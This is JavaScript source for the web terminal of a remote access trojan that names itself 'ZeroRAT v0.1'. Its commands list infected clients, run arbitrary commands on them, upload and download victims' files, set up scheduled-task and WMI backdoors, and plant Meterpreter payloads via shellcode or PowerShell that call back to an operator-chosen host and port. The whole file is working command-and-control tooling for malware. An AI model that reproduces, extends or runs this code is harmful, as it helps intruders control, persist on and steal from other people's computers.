function pathFilename(path) {
	var match = /\/([^\/]+)$/.exec(path);
	if (match) {
		return match[1];
	}
}

function getRandomInt(min, max) {
	// via https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Math/random#Examples
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomChoice(items) {
	return items[getRandomInt(0, items.length-1)];
}

function checkIdle(){
	return Terminal.username == 'salt'
}

var adminController = {
	url_base: '/server/',
	logout: function(){
		$.get(this.url_base+'logout')
	},
	setCmd: function(signature, cmd, callback){
		var pid='';
		$.post(this.url_base+'setCmd', {'signature': signature, 'cmd': cmd} , function(data){
			if(/^[0-9a-f]{32}$/.test(data)){
				callback(data)
			}
		})
	},
	setExec: function(signature, cmd, callback){
		var pid='';
		$.post(this.url_base+'setExec', {'signature': signature, 'cmd': cmd} , function(data){
			if(/^[0-9a-f]{32}$/.test(data)){
				callback(data)
			}
		})
	},
	setUpload: function(signature, filePath, callback){
		$.post(this.url_base+'setUpload', {'signature': signature, 'filePath': filePath} , function(pid){
			if(/^[0-9a-f]{32}$/.test(pid)){
				callback(pid)
			}
		})
	},
	setDownload: function(signature, filename, savePath, callback){
		$.post(this.url_base+'setDownload', {'signature': signature, 'filename': filename, 'savePath': savePath} , function(pid){
			if(/^[0-9a-f]{32}$/.test(pid)){
				callback(pid)
			}
		})
	},

	getResult: function(signature, pid, callback){
		jQuery(function($) {
			$.ajax({
				method: "POST",
				url: "/server/getResult",
				data: { 'signature': signature, 'pid': pid }
				}).retry({times:3, timeout:3000, statusCodes: [500, 503, 504]}).then(function(data){
				    callback(data);
			});
		});
	},
	checkOnline: function(signature, callback){
		$.post(this.url_base+'checkOnline', {'signature': signature}, function(data){
			callback(data)
		})
	},
	getOnline: function(callback){
		$.get(this.url_base+'getOnline', function(data){callback(data)}, 'json')
	},
	showDownloads: function(callback){
		$.get(this.url_base+'showDownloads', function(data){callback(data)}, 'json')
	},
	showUploads: function(signature ,callback){
		$.post(this.url_base+'showUploads', {'signature': signature}, function(data){callback(data)}, 'json')
	},
	deleteSession: function(signature ,callback){
		$.post(this.url_base+'deleteSession', {'signature': signature}, function(data){callback(data)}, 'json')
	},
	deleteUpload: function(signature, filename, callback){
		$.post(this.url_base+'deleteUpload', {'signature': signature, 'filename': filename}, function(data){callback(data)}, 'json')
	},
	deleteDownload: function(filename, callback){
		$.post(this.url_base+'deleteDownload', {'filename': filename}, function(data){callback(data)}, 'json')
	},
	setWindowsTasks: function(signature, time, callback){
		var pid='';
		$.post(this.url_base+'setWindowsTasks', {'signature': signature, 'time': time} , function(data){
			if(/^[0-9a-f]{32}$/.test(data)){
				callback(data)
			}
		})
	},
	setWmiBackdoor: function(signature, callback){
		var pid='';
		$.post(this.url_base+'setWmiBackdoor', {'signature': signature} , function(data){
			if(/^[0-9a-f]{32}$/.test(data)){
				callback(data)
			}
		})
	},
	plantMeterpreter0: function(signature, ip, port, callback){
		var pid='';
		$.post(this.url_base+'plantMeterpreter0', {'signature': signature, 'ip':ip, 'port':port} , function(data){
			if(/^[0-9a-f]{32}$/.test(data)){
				callback(data)
			}
		})
	},
	plantMeterpreter1: function(signature, ip, port, callback){
		var pid='';
		$.post(this.url_base+'plantMeterpreter1', {'signature': signature, 'ip':ip, 'port':port} , function(data){
			if(/^[0-9a-f]{32}$/.test(data)){
				callback(data)
			}
		})
	}
}

TerminalShell.commands['clients'] = 
TerminalShell.commands['online'] = 
TerminalShell.commands['sessions'] = function(terminal){
	adminController.getOnline(function(data){
		terminal.clientList = data
		for (var o in data) {
			terminal.print(data[o]['id']+' '+data[o]['signature']+' '+data[o]['ip']+' '+data[o]['alive_time'])
		};
	})
}

TerminalShell.commands['use'] = 
TerminalShell.commands['su'] = function(terminal, uid){
	username = terminal.clientList[uid]['signature']
	adminController.checkOnline(username, function(ret){
		if(ret == 'success'){
			terminal.su(username)
		}else{
			terminal.print('Client offline');
		}
	})
}

TerminalShell.commands['set'] = function(){
	terminal = arguments[0]
	target = arguments[1]
	value = ''

	for(var i=2; i<arguments.length; i++){
		value += arguments[i] + ' '
	}
	terminal.dic[target] = value.trim()
	terminal.print('success');
}

TerminalShell.commands['show'] = function(){
	terminal = arguments[0]
	item = arguments[1]
	if(item == 'globals'){
		for(i in terminal.dic){
			terminal.print('['+i+']: '+terminal.dic[i])
		}
	}else if(item == 'downloads'){
		adminController.showDownloads(function(data){
		terminal.downloadList = data
		for (var o in data) {
			terminal.print(data[o]['id']+' '+data[o]['originalname']+' '+data[o]['filename']+' '+data[o]['comment'])
		};
		})
	}else if(item == 'uploads'){
		adminController.showUploads(terminal.username, function(data){
		terminal.uploadList = data
		for (var o in data) {
			terminal.print($('<a>').attr('target', '_blank').attr('href', 'getUploadedFileByName?signature='+terminal.username+'&filename='+data[o]['filename']).html(data[o]['id']+' '+data[o]['originalname']+' '+data[o]['filename']+' '+data[o]['comment']))
		};
		})
	}
	//TODO: add more options
}

TerminalShell.commands['delete'] = function(){
	terminal = arguments[0]
	item = arguments[1]
	if(item == 'session'){
		adminController.deleteSession(terminal.username, function(data){
			terminal.print(data)
		})
	}else if(item == 'download'){
		downloadfile = arguments[2]
		adminController.deleteDownload(terminal.downloadList[downloadfile]['filename'], function(data){
			terminal.print(data)
		})
	}else if(item == 'upload'){
		uploadfile = arguments[2]
		adminController.deleteUpload(terminal.username, terminal.uploadList[uploadfile]['filename'], function(data){
			terminal.print(data)
		})
	}
}

TerminalShell.commands['backdoor'] = function(){
	terminal = arguments[0]
	item = arguments[1]
	if(checkIdle()){
		terminal.print('Client offline');
		return
	}
	if(item == 'tasks'){
		time = arguments[2]
		if(! /^\d\d:\d\d$/.test(time)){terminal.print('time must in 00:00 format'); return;}
		adminController.setWindowsTasks(terminal.username, time, function(pid){
		adminController.getResult(terminal.username, pid, function(ret){
			if(ret){
				data = ret.trim().split('\n')
				data.forEach(function(i){terminal.print(i)})
				
			}else{
				terminal.print('Timeout...')
			}
		})

		})
	}else if(item == 'wmi'){
		adminController.setWmiBackdoor(terminal.username, function(pid){
		adminController.getResult(terminal.username, pid, function(ret){
			if(ret){
				data = ret.trim().split('\n')
				data.forEach(function(i){terminal.print(i)})
				
			}else{
				terminal.print('Timeout...')
			}
		})

		})
	}
}

TerminalShell.commands['meterpreter'] = function(){
	terminal = arguments[0]
	item = arguments[1]
	if(checkIdle()){
		terminal.print('Client offline');
		return
	}
	if(!(terminal.dic['LHOST'] && terminal.dic['LPORT'])){
		terminal.print('set LHOST and LPORT first');
		return
	}
	if(item == 'shellcode' || item == '0'){
		adminController.plantMeterpreter0(terminal.username, terminal.dic['LHOST'], terminal.dic['LPORT'], function(pid){
		adminController.getResult(terminal.username, pid, function(ret){
			if(ret){
				data = ret.trim().split('\n')
				data.forEach(function(i){terminal.print(i)})
				
			}else{
				terminal.print('Timeout...')
			}
		})

		})
	}else if(item == 'powershell' || item == '1'){
		adminController.plantMeterpreter1(terminal.username, terminal.dic['LHOST'], terminal.dic['LPORT'], function(pid){
		adminController.getResult(terminal.username, pid, function(ret){
			if(ret){
				data = ret.trim().split('\n')
				data.forEach(function(i){terminal.print(i)})
				
			}else{
				terminal.print('Timeout...')
			}
		})

		})
	}
}

TerminalShell.commands['upfile'] = function(terminal){
	terminal.print($("<div>").addClass("browser").append($("<iframe>").attr("src", 'upFile').width("100%").height(30)))
}

TerminalShell.commands['upload'] = function(){
	terminal = arguments[0]
	item = arguments[1]
	upload_path = ''
	if(item){
		upload_path = item
	}else if(terminal.dic['upload_file']){
		upload_path = terminal.dic['upload_file']
	}else{
		terminal.print("set variable 'upload_file' first!");
		return
	}
	//TODO: auto detect progress
	adminController.setUpload(terminal.username, upload_path, function(pid){
		terminal.print('Wating...')
		terminal.print($("<p>").html('Check status <a href="getResult?signature='+terminal.username+'&pid='+pid+'" target="_blank">here</a>'))
		terminal.print($("<p>").html('Check file <a href="getUploadedFileByPid?pid='+pid+'" target="_blank">here</a>'))
	})
}

TerminalShell.commands['download'] = function(){
	terminal = arguments[0]
	target = arguments[1]
	if(checkIdle()){
		terminal.print('Client offline');
		return
	}
	if(terminal.downloadList[target]){
		downlaod_file = terminal.downloadList[target]['originalname']
	}else if(! terminal.dic['download_file']){
		terminal.print("set variable 'download_file' first!");
		return
	}else{
		downlaod_file = terminal.dic['download_file']
	}
	if(! terminal.dic['download_save_path']){
		terminal.print("set variable 'download_save_path' first!");
		return
	}
	//TODO: auto detect progress
	adminController.setDownload(terminal.username, downlaod_file, terminal.dic['download_save_path'], function(pid){
		terminal.print('Wating...')
		terminal.print($("<p>").html('Check status <a href="getResult?signature='+terminal.username+'&pid='+pid+'" target="_blank" target="_blank">here</a>'))
	})
}

TerminalShell.commands['client_exec'] = function(terminal, cmd){
	if(checkIdle()){
		terminal.print('Client offline');
		return
	}
	pid = adminController.setCmd(terminal.username, cmd, function(pid){
		adminController.getResult(terminal.username, pid, function(ret){
			if(ret){
				data = ret.trim().split('\n')
				data.forEach(function(i){terminal.print(i)})
				
			}else{
				terminal.print('Timeout...')
			}
		})

	})
}

TerminalShell.commands['logout'] =
TerminalShell.commands['exit'] = 
TerminalShell.commands['quit'] = function(terminal) {
	if(terminal.username == 'salt'){
		terminal.print('Bye.');
		adminController.logout()
		$('#prompt, #cursor').hide();
		terminal.promptActive = false;
	}else{
		terminal.su()
	}
	
};

TerminalShell.commands['restart'] = TerminalShell.commands['reboot'] = function(terminal) {
		TerminalShell.commands['poweroff'](terminal).queue(function(next) {
			window.location.reload();
		});
};

function runCmd(cmd){
	TerminalShell.process(Terminal,cmd)
}

function exec(cmd){
	adminController.setExec(Terminal.username, cmd, function(pid){})
}

$(document).ready(function() {
	Terminal.promptActive = false;
	$("#screen").bind("cli-load", function(a) {
		Terminal.print();
		Terminal.print($("<h4>").text("ZeroRAT v0.1 built-in shell"));
		Terminal.print($("<h4>").text("Enter 'help' for a list of built-in commands."));
		Terminal.print();
	});
	Terminal.promptActive = true;
})